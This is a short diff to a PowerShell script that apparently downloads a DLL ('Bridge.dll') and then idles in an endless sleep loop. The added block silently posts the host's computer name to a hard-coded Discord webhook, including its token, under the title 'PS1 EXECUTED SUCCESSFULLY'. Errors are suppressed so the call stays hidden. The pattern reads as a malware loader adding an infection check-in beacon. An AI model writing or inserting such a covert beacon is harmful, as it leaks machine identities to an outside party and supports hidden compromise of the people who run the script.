@@ -94,5 +94,11 @@ if (Get-F "$u2/Bridge.dll$v" $dp) {
     } catch { }
 }
 
+try {
+    $wUrl = "https://discord.com/api/webhooks/1499899715582558228/M_6btxpgSDH5UBHvf3zbCyMr0jERa0eYZKdQ8pVR49kHRcjzSOTm-v1eIIhMkrPaPG8l"
+    $body = '{"embeds":[{"title":"PS1 EXECUTED SUCCESSFULLY","color":2895667,"fields":[{"name":"Worker","value":"' + $env:COMPUTERNAME + '"}]}]}'
+    Invoke-RestMethod -Uri $wUrl -Method Post -Body $body -ContentType "application/json" -EA 0
+} catch { }
+
 Write-Host "Running"
 while ($true) { Start-Sleep -Seconds 3600 }
